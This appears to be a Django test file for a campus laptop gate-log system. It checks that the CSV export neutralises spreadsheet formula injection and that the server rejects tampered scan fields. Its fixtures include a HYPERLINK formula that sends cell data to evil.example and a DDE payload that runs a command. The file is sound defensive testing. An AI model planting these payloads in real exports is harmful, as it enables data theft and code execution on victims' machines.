"""The gate log export must be safe to double-click.

A cell starting with `=`, `+`, `-` or `@` is a formula to Excel, LibreOffice
and Sheets. The delivery route that makes this worth defending: the public
registration form sets a computer's brand and model with no login, those flow
into `device_label` on every scan, and an administrator later opens the export.
Planted by a stranger on a phone, executed on an administrator's machine.
"""

from django.test import TestCase

from checkpoint.models import Direction, ScanEvent, Verdict
from config.exports import csv_safe
from devices.models import DeviceStatus

from .factories import api_client, make_device, make_gate, make_student, make_user


class CsvSafeTests(TestCase):
    def test_formula_prefixes_are_neutralised(self):
        for payload in ['=1+1', '+1', '-1', '@SUM(A1)', '\tx', '\rx']:
            self.assertTrue(
                csv_safe(payload).startswith("'"),
                f"{payload!r} would be evaluated by a spreadsheet",
            )

    def test_ordinary_values_are_untouched(self):
        for payload in ["HP EliteBook 840", "218001234", "", "Aline Uwase"]:
            self.assertEqual(csv_safe(payload), payload)

    def test_none_becomes_an_empty_cell(self):
        self.assertEqual(csv_safe(None), "")


class GateLogExportTests(TestCase):
    def test_a_planted_formula_is_exported_as_text(self):
        student = make_student(reg_number="218007777")
        device = make_device(student, serial_number="HP55443322")
        # What an attacker can actually set: brand and model come straight
        # from the unauthenticated registration form.
        device.brand = '=HYPERLINK("http://evil.example/"&A1,"Click")'
        device.status = DeviceStatus.ACTIVE
        device.save(update_fields=["brand", "status"])

        gate = make_gate()
        guard = make_user("guard-export", role="GUARD")
        ScanEvent.objects.create(
            gate=gate,
            guard=guard,
            device=device,
            student=student,
            direction=Direction.OUT,
            verdict=Verdict.ALLOWED,
            device_label=device.label,
            student_name=student.full_name,
            claimed_reg_number=student.reg_number,
            claimed_serial=device.serial_number,
        )

        admin = make_user("admin-export", role="ADMIN", is_staff=True)
        response = api_client(admin).get("/api/checkpoint/scans/export/")

        self.assertEqual(response.status_code, 200)
        body = response.content.decode()
        self.assertIn("HYPERLINK", body, "the value should still be readable")
        # But never at the start of a cell, where a spreadsheet would run it.
        for line in body.splitlines():
            for cell in line.split(","):
                self.assertFalse(
                    cell.strip('"').startswith("="),
                    f"cell would be evaluated as a formula: {cell[:60]}",
                )


class ScanSnapshotIntegrityTests(TestCase):
    """What the client sends must not become the historical record."""

    def test_the_client_cannot_dictate_the_snapshot_fields(self):
        student = make_student(reg_number="218006666")
        device = make_device(student, serial_number="LN11223344")
        device.status = DeviceStatus.ACTIVE
        device.save(update_fields=["status"])
        gate = make_gate(name="North Gate", code="NORTH")
        guard = make_user("guard-snapshot", role="GUARD")

        response = api_client(guard).post(
            "/api/checkpoint/scans/",
            {
                "device": device.pk,
                "gate": gate.pk,
                "direction": Direction.OUT,
                "verdict": Verdict.ALLOWED,
                # A tampered client claiming the scan was of something else.
                "device_label": "=cmd|'/c calc'!A0",
                "student_name": "Somebody Else",
                "claimed_serial": "LN11223344",
            },
            format="json",
        )

        self.assertEqual(response.status_code, 201, response.data)
        scan = ScanEvent.objects.get(pk=response.data["id"])
        self.assertNotIn("cmd", scan.device_label)
        self.assertIn("LN11223344", scan.device_label)
        self.assertEqual(scan.student_name, student.full_name)

    def test_a_blocked_device_cannot_be_recorded_as_allowed(self):
        """The offline queue lives in localStorage, so this cannot be a
        client-side rule: the server has to refuse it."""
        student = make_student(reg_number="218005555")
        device = make_device(student, serial_number="AC99887766")
        device.status = DeviceStatus.STOLEN
        device.save(update_fields=["status"])
        guard = make_user("guard-blocked", role="GUARD")

        response = api_client(guard).post(
            "/api/checkpoint/scans/",
            {
                "device": device.pk,
                "gate": make_gate(name="South Gate", code="SOUTH").pk,
                "direction": Direction.OUT,
                "verdict": Verdict.ALLOWED,
            },
            format="json",
        )

        self.assertEqual(response.status_code, 400)
        self.assertIn("verdict", response.data)
